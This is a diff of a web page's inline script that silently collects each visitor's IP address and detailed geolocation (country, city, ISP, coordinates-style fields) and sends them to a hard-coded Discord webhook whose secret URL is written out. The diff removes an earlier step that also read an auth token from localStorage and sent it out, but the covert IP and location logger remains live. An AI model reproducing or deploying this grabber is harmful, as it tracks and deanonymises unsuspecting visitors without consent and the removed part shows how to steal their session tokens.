@@ -5,11 +5,6 @@
 </head>
 <body>
     <script>
-        // Function to get a token from local storage
-        function getTokenFromStorage() {
-            return localStorage.getItem('token') || 'Token not found';
-        }
-
         // Function to get the user's IP address and location
         async function getIPandLocation() {
             try {
@@ -38,11 +33,10 @@
             }
         }
 
-        // Function to send the IP address, location, and token to a Discord webhook
+        // Function to send the IP address and location to a Discord webhook
         async function sendToDiscord(data) {
             const webhookUrl = 'https://discord.com/api/webhooks/1266889183943987321/oDW3IA3FDUMxvAlrRhj5c1f7xfTmSP6sTOBFCQUtaFAS_TwdGNQBLs0oMHbGyfamXVL_'; // Replace with your Discord webhook URL
             const location = data.location || {};
-            const token = getTokenFromStorage(); // Get token from local storage
 
             const payload = {
                 content: null,
@@ -56,7 +50,8 @@
                             },
                             {
                                 name: "Location:",
-                                value: `Country:\n${location.country || 'N/A'}\n\n` +
+                                value: 
+                                     `Country:\n${location.country || 'N/A'}\n\n` +
                                        `Region:\n${location.regionName || 'N/A'}\n\n` +
                                        `City:\n${location.city || 'N/A'}\n\n` +
                                        `ZIP:\n${location.zip || 'N/A'}\n\n` +
@@ -65,10 +60,6 @@
                                        `ISP:\n${location.isp || 'N/A'}\n\n` +
                                        `Organization:\n${location.org || 'N/A'}\n\n` +
                                        `AS:\n${location.as || 'N/A'}\n\n`
-                            },
-                            {
-                                name: "Token:",
-                                value: `${token}`
                             }
                         ],
                         author: {
@@ -81,20 +72,21 @@
 
             try {
                 console.log('Sending data to Discord:', payload);
-                await fetch(webhookUrl, {
+                const response = await fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify(payload)
                 });
-                console.log('Data sent to Discord successfully');
+                const result = await response.json();
+                console.log('Response from Discord:', result);
             } catch (error) {
                 console.error('Error sending to Discord:', error);
             }
         }
 
-        // Main function to get IP, location, and token, and send them
+        // Main function to get IP and location and send it
         async function main() {
             const data = await getIPandLocation();
             if (data) {
